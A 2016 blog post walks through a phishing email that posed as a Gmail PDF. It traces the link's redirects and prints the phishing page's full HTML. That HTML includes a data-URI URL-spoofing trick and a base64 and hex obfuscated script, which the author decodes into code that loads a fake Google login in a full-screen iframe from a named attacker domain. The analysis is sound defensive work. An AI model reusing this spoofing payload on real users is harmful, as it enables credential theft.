---
layout: post
title:  "Analysing a Phishing Mail"
date:   2016-06-01
categories:
- phishing
- its
- javascript
---


Today I received the following mail in my inbox, pretending to be from someone
who actually works at Cloud66:

![Screenshot of the mail](/assets/images/2016-06-01-analysing-phishing-mail/01.png?cachebreak)


What's bothering me is that it has a valid DKIM signature, so it looks like her
Google account actually got hacked. I reported it to Cloud66 but in this post
I will focus on the contents of the actual mail.

As you can see it consists mainly of an image that's supposed to look like a
Gmail PDF attachment. It links to http://erikhtrasisetrnglandtrrg.igg.biz/ which
in turn redirects to http://exquisiterewoods.top/aboutus/testomonials.htm:

{% highlight bash %}
» curl -i http://erikhtrasisetrnglandtrrg.igg.biz/
HTTP/1.1 302 FOUND
Server: nginx/1.4.6 (Ubuntu)
Date: Wed, 01 Jun 2016 06:11:23 GMT
Content-Type: text/html; charset=utf-8
Transfer-Encoding: chunked
Connection: keep-alive
Vary: Accept-Language
Location: http://exquisiterewoods.top/aboutus/testomonials.htm
Content-Language: en
{% endhighlight %}

This html page is only around 2kb (that's 1/40th of the size of the current
minified jQuery release - scammers know what they're doing for sure!):

{% highlight html %}
<meta http-equiv="Refresh" content="0; url=data:text/html,https://accounts.google.com/ServiceLogin?service=mail&passive=true&rm=false&continue                                                                                                                                                                                                                                    <script src=data:text/html;base64,dmFyIF8weGRjMGY9WyJceDc0XHg2OVx4NzRceDZDXHg2NSIsIlx4NjRceDZGXHg2M1x4NzVceDZE
XHg2NVx4NkVceDc0IiwiXHg1OVx4NkZceDc1XHgyMFx4NjhceDYxXHg3Nlx4NjVceDIwXHg2Mlx4
NjVceDY1XHg2RVx4MjBceDUzXHg2OVx4NjdceDZFXHg2NVx4NjRceDIwXHg2Rlx4NzVceDc0Iiwi
XHg2Q1x4NjlceDZFXHg2QiIsIlx4NjNceDcyXHg2NVx4NjFceDc0XHg2NVx4NDVceDZDXHg2NVx4
NkRceDY1XHg2RVx4NzQiLCJceDc0XHg3OVx4NzBceDY1IiwiXHg2OVx4NkRceDYxXHg2N1x4NjVc
eDJGXHg3OFx4MkRceDY5XHg2M1x4NkZceDZFIiwiXHg3Mlx4NjVceDZDIiwiXHg3M1x4NjhceDZG
XHg3Mlx4NzRceDYzXHg3NVx4NzRceDIwXHg2OVx4NjNceDZGXHg2RSIsIlx4NjhceDcyXHg2NVx4
NjYiLCIiLCJceDYxXHg3MFx4NzBceDY1XHg2RVx4NjRceDQzXHg2OFx4NjlceDZDXHg2NCIsIlx4
NjhceDY1XHg2MVx4NjQiLCJceDY3XHg2NVx4NzRceDQ1XHg2Q1x4NjVceDZEXHg2NVx4NkVceDc0
XHg3M1x4NDJceDc5XHg1NFx4NjFceDY3XHg0RVx4NjFceDZEXHg2NSIsIlx4NkZceDc1XHg3NFx4
NjVceDcyXHg0OFx4NTRceDREXHg0QyIsIlx4NjJceDZGXHg2NFx4NzkiLCJceDNDXHg2OVx4NjZc
eDcyXHg2MVx4NkRceDY1XHgyMFx4NzNceDcyXHg2M1x4M0RceDIyXHg2OFx4NzRceDc0XHg3MFx4
M0FceDJGXHgyRlx4NjVceDc4XHg3MVx4NzVceDY5XHg3M1x4NjlceDc0XHg2NVx4NzJceDY1XHg3
N1x4NkZceDZGXHg2NFx4NzNceDJFXHg3NFx4NkZceDcwXHgyRlx4NjFceDYyXHg2Rlx4NzVceDc0
XHg3NVx4NzNceDJGXHg2Rlx4NzVceDcyXHg3NFx4NjVceDYxXHg2RFx4NkRceDY1XHg2NFx4Njlc
eDYxXHg3MFx4NjFceDcyXHg3NFx4NkVceDY1XHg3Mlx4NzNceDJFXHg2OFx4NzRceDZEXHg2Q1x4
MjJceDIwXHg3M1x4NzRceDc5XHg2Q1x4NjVceDNEXHgyMlx4NjJceDZGXHg3Mlx4NjRceDY1XHg3
Mlx4M0FceDIwXHgzMFx4M0JceDc3XHg2OVx4NjRceDc0XHg2OFx4M0FceDIwXHgzMVx4MzBceDMw
XHgyNVx4M0JceDY4XHg2NVx4NjlceDY3XHg2OFx4NzRceDNBXHgzMVx4MzBceDMwXHgyNVx4MjJc
eDNFXHgzQ1x4MkZceDY5XHg2Nlx4NzJceDYxXHg2RFx4NjVceDNFIl07d2luZG93W18weGRjMGZb
MV1dW18weGRjMGZbMF1dPV8weGRjMGZbMl07dHJ5eyhmdW5jdGlvbigpe3ZhciBfMHg4NjM3eDE9
d2luZG93W18weGRjMGZbMV1dW18weGRjMGZbNF1dKF8weGRjMGZbM10pO18weDg2Mzd4MVtfMHhk
YzBmWzVdXT1fMHhkYzBmWzZdO18weDg2Mzd4MVtfMHhkYzBmWzddXT1fMHhkYzBmWzhdO18weDg2
Mzd4MVtfMHhkYzBmWzldXT1fMHhkYzBmWzEwXTtkb2N1bWVudFtfMHhkYzBmWzEzXV0oXzB4ZGMw
ZlsxMl0pWzBdW18weGRjMGZbMTFdXShfMHg4NjM3eDEpfSgpKX1jYXRjaChlKXt9O3dpbmRvd1tf
MHhkYzBmWzFdXVtfMHhkYzBmWzE1XV1bXzB4ZGMwZlsxNF1dPV8weGRjMGZbMTZd></script>">
{% endhighlight %}

What it does is redirect you to an HTML data URI, which is why the resulting
page looks surprisingly trustworthy to an unsuspecting user:


![The phishing page](/assets/images/2016-06-01-analysing-phishing-mail/02.png)

Okay so the magic seems to happen in this base64 encoded JavaScript code:

{% highlight javascript %}
dmFyIF8weGRjMGY9WyJceDc0XHg2OVx4NzRceDZDXHg2NSIsIlx4NjRceDZGXHg2M1x4NzVceDZE
XHg2NVx4NkVceDc0IiwiXHg1OVx4NkZceDc1XHgyMFx4NjhceDYxXHg3Nlx4NjVceDIwXHg2Mlx4
NjVceDY1XHg2RVx4MjBceDUzXHg2OVx4NjdceDZFXHg2NVx4NjRceDIwXHg2Rlx4NzVceDc0Iiwi
XHg2Q1x4NjlceDZFXHg2QiIsIlx4NjNceDcyXHg2NVx4NjFceDc0XHg2NVx4NDVceDZDXHg2NVx4
NkRceDY1XHg2RVx4NzQiLCJceDc0XHg3OVx4NzBceDY1IiwiXHg2OVx4NkRceDYxXHg2N1x4NjVc
eDJGXHg3OFx4MkRceDY5XHg2M1x4NkZceDZFIiwiXHg3Mlx4NjVceDZDIiwiXHg3M1x4NjhceDZG
XHg3Mlx4NzRceDYzXHg3NVx4NzRceDIwXHg2OVx4NjNceDZGXHg2RSIsIlx4NjhceDcyXHg2NVx4
NjYiLCIiLCJceDYxXHg3MFx4NzBceDY1XHg2RVx4NjRceDQzXHg2OFx4NjlceDZDXHg2NCIsIlx4
NjhceDY1XHg2MVx4NjQiLCJceDY3XHg2NVx4NzRceDQ1XHg2Q1x4NjVceDZEXHg2NVx4NkVceDc0
XHg3M1x4NDJceDc5XHg1NFx4NjFceDY3XHg0RVx4NjFceDZEXHg2NSIsIlx4NkZceDc1XHg3NFx4
NjVceDcyXHg0OFx4NTRceDREXHg0QyIsIlx4NjJceDZGXHg2NFx4NzkiLCJceDNDXHg2OVx4NjZc
eDcyXHg2MVx4NkRceDY1XHgyMFx4NzNceDcyXHg2M1x4M0RceDIyXHg2OFx4NzRceDc0XHg3MFx4
M0FceDJGXHgyRlx4NjVceDc4XHg3MVx4NzVceDY5XHg3M1x4NjlceDc0XHg2NVx4NzJceDY1XHg3
N1x4NkZceDZGXHg2NFx4NzNceDJFXHg3NFx4NkZceDcwXHgyRlx4NjFceDYyXHg2Rlx4NzVceDc0
XHg3NVx4NzNceDJGXHg2Rlx4NzVceDcyXHg3NFx4NjVceDYxXHg2RFx4NkRceDY1XHg2NFx4Njlc
eDYxXHg3MFx4NjFceDcyXHg3NFx4NkVceDY1XHg3Mlx4NzNceDJFXHg2OFx4NzRceDZEXHg2Q1x4
MjJceDIwXHg3M1x4NzRceDc5XHg2Q1x4NjVceDNEXHgyMlx4NjJceDZGXHg3Mlx4NjRceDY1XHg3
Mlx4M0FceDIwXHgzMFx4M0JceDc3XHg2OVx4NjRceDc0XHg2OFx4M0FceDIwXHgzMVx4MzBceDMw
XHgyNVx4M0JceDY4XHg2NVx4NjlceDY3XHg2OFx4NzRceDNBXHgzMVx4MzBceDMwXHgyNVx4MjJc
eDNFXHgzQ1x4MkZceDY5XHg2Nlx4NzJceDYxXHg2RFx4NjVceDNFIl07d2luZG93W18weGRjMGZb
MV1dW18weGRjMGZbMF1dPV8weGRjMGZbMl07dHJ5eyhmdW5jdGlvbigpe3ZhciBfMHg4NjM3eDE9
d2luZG93W18weGRjMGZbMV1dW18weGRjMGZbNF1dKF8weGRjMGZbM10pO18weDg2Mzd4MVtfMHhk
YzBmWzVdXT1fMHhkYzBmWzZdO18weDg2Mzd4MVtfMHhkYzBmWzddXT1fMHhkYzBmWzhdO18weDg2
Mzd4MVtfMHhkYzBmWzldXT1fMHhkYzBmWzEwXTtkb2N1bWVudFtfMHhkYzBmWzEzXV0oXzB4ZGMw
ZlsxMl0pWzBdW18weGRjMGZbMTFdXShfMHg4NjM3eDEpfSgpKX1jYXRjaChlKXt9O3dpbmRvd1tf
MHhkYzBmWzFdXVtfMHhkYzBmWzE1XV1bXzB4ZGMwZlsxNF1dPV8weGRjMGZbMTZd
{% endhighlight %}

Let's quickly decode it:

{% highlight javascript %}
var _0xdc0f=["\x74\x69\x74\x6C\x65","\x64\x6F\x63\x75\x6D\x65\x6E\x74","\x59\x6F\x75\x20\x68\x61\x76\x65\x20\x62\x65\x65\x6E\x20\x53\x69\x67\x6E\x65\x64\x20\x6F\x75\x74","\x6C\x69\x6E\x6B","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x74\x79\x70\x65","\x69\x6D\x61\x67\x65\x2F\x78\x2D\x69\x63\x6F\x6E","\x72\x65\x6C","\x73\x68\x6F\x72\x74\x63\x75\x74\x20\x69\x63\x6F\x6E","\x68\x72\x65\x66","","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x68\x65\x61\x64","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x6F\x75\x74\x65\x72\x48\x54\x4D\x4C","\x62\x6F\x64\x79","\x3C\x69\x66\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x22\x68\x74\x74\x70\x3A\x2F\x2F\x65\x78\x71\x75\x69\x73\x69\x74\x65\x72\x65\x77\x6F\x6F\x64\x73\x2E\x74\x6F\x70\x2F\x61\x62\x6F\x75\x74\x75\x73\x2F\x6F\x75\x72\x74\x65\x61\x6D\x6D\x65\x64\x69\x61\x70\x61\x72\x74\x6E\x65\x72\x73\x2E\x68\x74\x6D\x6C\x22\x20\x73\x74\x79\x6C\x65\x3D\x22\x62\x6F\x72\x64\x65\x72\x3A\x20\x30\x3B\x77\x69\x64\x74\x68\x3A\x20\x31\x30\x30\x25\x3B\x68\x65\x69\x67\x68\x74\x3A\x31\x30\x30\x25\x22\x3E\x3C\x2F\x69\x66\x72\x61\x6D\x65\x3E"];window[_0xdc0f[1]][_0xdc0f[0]]=_0xdc0f[2];try{(function(){var _0x8637x1=window[_0xdc0f[1]][_0xdc0f[4]](_0xdc0f[3]);_0x8637x1[_0xdc0f[5]]=_0xdc0f[6];_0x8637x1[_0xdc0f[7]]=_0xdc0f[8];_0x8637x1[_0xdc0f[9]]=_0xdc0f[10];document[_0xdc0f[13]](_0xdc0f[12])[0][_0xdc0f[11]](_0x8637x1)}())}catch(e){};window[_0xdc0f[1]][_0xdc0f[15]][_0xdc0f[14]]=_0xdc0f[16]
{% endhighlight %}

Uh oh. Challenge accepted!

Let's format it to become a bit more readable:

{% highlight javascript %}
var _0xdc0f = ["\x74\x69\x74\x6C\x65", "\x64\x6F\x63\x75\x6D\x65\x6E\x74", "\x59\x6F\x75\x20\x68\x61\x76\x65\x20\x62\x65\x65\x6E\x20\x53\x69\x67\x6E\x65\x64\x20\x6F\x75\x74", "\x6C\x69\x6E\x6B", "\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74", "\x74\x79\x70\x65", "\x69\x6D\x61\x67\x65\x2F\x78\x2D\x69\x63\x6F\x6E", "\x72\x65\x6C", "\x73\x68\x6F\x72\x74\x63\x75\x74\x20\x69\x63\x6F\x6E", "\x68\x72\x65\x66", "", "\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64", "\x68\x65\x61\x64", "\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65", "\x6F\x75\x74\x65\x72\x48\x54\x4D\x4C", "\x62\x6F\x64\x79", "\x3C\x69\x66\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x22\x68\x74\x74\x70\x3A\x2F\x2F\x65\x78\x71\x75\x69\x73\x69\x74\x65\x72\x65\x77\x6F\x6F\x64\x73\x2E\x74\x6F\x70\x2F\x61\x62\x6F\x75\x74\x75\x73\x2F\x6F\x75\x72\x74\x65\x61\x6D\x6D\x65\x64\x69\x61\x70\x61\x72\x74\x6E\x65\x72\x73\x2E\x68\x74\x6D\x6C\x22\x20\x73\x74\x79\x6C\x65\x3D\x22\x62\x6F\x72\x64\x65\x72\x3A\x20\x30\x3B\x77\x69\x64\x74\x68\x3A\x20\x31\x30\x30\x25\x3B\x68\x65\x69\x67\x68\x74\x3A\x31\x30\x30\x25\x22\x3E\x3C\x2F\x69\x66\x72\x61\x6D\x65\x3E"];
window[_0xdc0f[1]][_0xdc0f[0]] = _0xdc0f[2];
try {
    (function() {
        var _0x8637x1 = window[_0xdc0f[1]][_0xdc0f[4]](_0xdc0f[3]);
        _0x8637x1[_0xdc0f[5]] = _0xdc0f[6];
        _0x8637x1[_0xdc0f[7]] = _0xdc0f[8];
        _0x8637x1[_0xdc0f[9]] = _0xdc0f[10];
        document[_0xdc0f[13]](_0xdc0f[12])[0][_0xdc0f[11]](_0x8637x1)
    }())
} catch (e) {};
window[_0xdc0f[1]][_0xdc0f[15]][_0xdc0f[14]] = _0xdc0f[16]
{% endhighlight %}

So we have an array consisting of strings containing what looks like hex
characters.
Fortunately we can decode it to ASCII using Python real easy:

{% highlight python %}
>>> map(str, ["\x74\x69\x74\x6C\x65", "\x64\x6F\x63\x75\x6D\x65\x6E\x74", "\x59\x6F\x75\x20\x68\x61\x76\x65\x20\x62\x65\x65\x6E\x20\x53\x69\x67\x6E\x65\x64\x20\x6F\x75\x74", "\x6C\x69\x6E\x6B", "\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74", "\x74\x79\x70\x65", "\x69\x6D\x61\x67\x65\x2F\x78\x2D\x69\x63\x6F\x6E", "\x72\x65\x6C", "\x73\x68\x6F\x72\x74\x63\x75\x74\x20\x69\x63\x6F\x6E", "\x68\x72\x65\x66", "", "\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64", "\x68\x65\x61\x64", "\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65", "\x6F\x75\x74\x65\x72\x48\x54\x4D\x4C", "\x62\x6F\x64\x79", "\x3C\x69\x66\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x22\x68\x74\x74\x70\x3A\x2F\x2F\x65\x78\x71\x75\x69\x73\x69\x74\x65\x72\x65\x77\x6F\x6F\x64\x73\x2E\x74\x6F\x70\x2F\x61\x62\x6F\x75\x74\x75\x73\x2F\x6F\x75\x72\x74\x65\x61\x6D\x6D\x65\x64\x69\x61\x70\x61\x72\x74\x6E\x65\x72\x73\x2E\x68\x74\x6D\x6C\x22\x20\x73\x74\x79\x6C\x65\x3D\x22\x62\x6F\x72\x64\x65\x72\x3A\x20\x30\x3B\x77\x69\x64\x74\x68\x3A\x20\x31\x30\x30\x25\x3B\x68\x65\x69\x67\x68\x74\x3A\x31\x30\x30\x25\x22\x3E\x3C\x2F\x69\x66\x72\x61\x6D\x65\x3E"])
['title', 'document', 'You have been Signed out', 'link', 'createElement', 'type', 'image/x-icon', 'rel', 'shortcut icon', 'href', '', 'appendChild', 'head', 'getElementsByTagName', 'outerHTML', 'body', '<iframe src="http://exquisiterewoods.top/aboutus/ourteammediapartners.html" style="border: 0;width: 100%;height:100%"></iframe>']
{% endhighlight %}


Now we can substitute the variables with their values:

{% highlight javascript %}
window['document']['title'] = 'You have been Signed out';
try {
    (function() {
        var _0x8637x1 = window['document']['createElement']('link');
        _0x8637x1['type'] = 'image/x-icon';
        _0x8637x1['rel'] = 'shortcut icon';
        _0x8637x1['href'] = '';
        document['getElementsByTagName']('head')[0]['appendChild'](_0x8637x1)
    }())
} catch (e) {};
window['document']['body']['outerHTML'] = '<iframe src="http://exquisiterewoods.top/aboutus/ourteammediapartners.html" style="border: 0;width: 100%;height:100%"></iframe>'
{% endhighlight %}


Well, that was easy 😒 The only thing it does is set the favicon to... I think
they wanted to set it to the Google one but forgot to set the href? - and embed
an iframe containing the actual phising site. The actual phishing site is a
simple copy of the real Google login form with the difference that it posts
the captured email / password to an PHP script on some other hacked server.


## Lessons learned

Google Mail's phishing filter isn't as good as I thought (the mail went into my
inbox) which may also have been caused by the fact that the scammers seemed to
have captured a real Google Mail account which they used to send the mails.
The use of a data uri to set the displayed URL was a neat trick, even though
the code obfuscation wasn't as advanced as I initially thought.
